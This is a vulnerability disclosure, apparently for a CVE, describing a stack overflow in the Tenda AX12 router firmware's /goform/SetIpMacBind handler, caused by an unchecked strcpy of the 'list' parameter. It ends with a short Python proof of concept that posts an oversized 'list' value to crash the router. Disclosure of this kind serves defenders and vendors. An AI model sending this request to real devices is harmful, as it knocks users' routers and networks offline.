## Vulnerability description ##
Affect device：Tenda-AX12 V22.03.01.21_CN([https://www.tenda.com.cn/download/detail-3237.html](https://www.tenda.com.cn/download/detail-3237.html))

Vulnerability Type: Stack overflow

Impact: Denial of Service(DoS)

## Vulnerability description ##
This vulnerability is a vulnerability overflow triggered in the **sub_42FDE4** function, which satisfies the request of the upper-level interface function **sub_430124**, that is, handles the post request under **/goform/SetIpMacBind**



First, sub_430124 calls the sub_42FFF8 function.

![](https://github.com/The-Itach1/IOT-CVE/blob/master/Tenda/AX12/1/image/Snipaste_2022-07-30_18-20-26.png)

In the **sub_42FFF8** function, the two parameters **bindnum** and **list** passed in by the post are obtained, and the address of the list value is used as the parameter of the **sub_42FDE4** function.

![](https://github.com/The-Itach1/IOT-CVE/blob/master/Tenda/AX12/1/image/Snipaste_2022-07-30_18-28-01.png)



**sub_42FDE4**, **strcpy(v16, v6)**, **v6** is the incoming **list** parameter, and no length limit and security check are used in this process, so the attacker can cause stack overflow through a long **list** and achieve denial of service attack.

![](https://github.com/The-Itach1/IOT-CVE/blob/master/Tenda/AX12/1/image/Snipaste_2022-07-30_18-33-51.png)



## POC ##

Poc of Denial of Service(DoS):

```python

import requests
from pwn import *

url = "http://192.168.0.1/goform/SetIpMacBind"
cookie = {"Cookie":"password=1111"}
data = {"bindnum": "1", "list":"\r" + "A" * 1000}


requests.post(url, cookies=cookie, data=data)
```
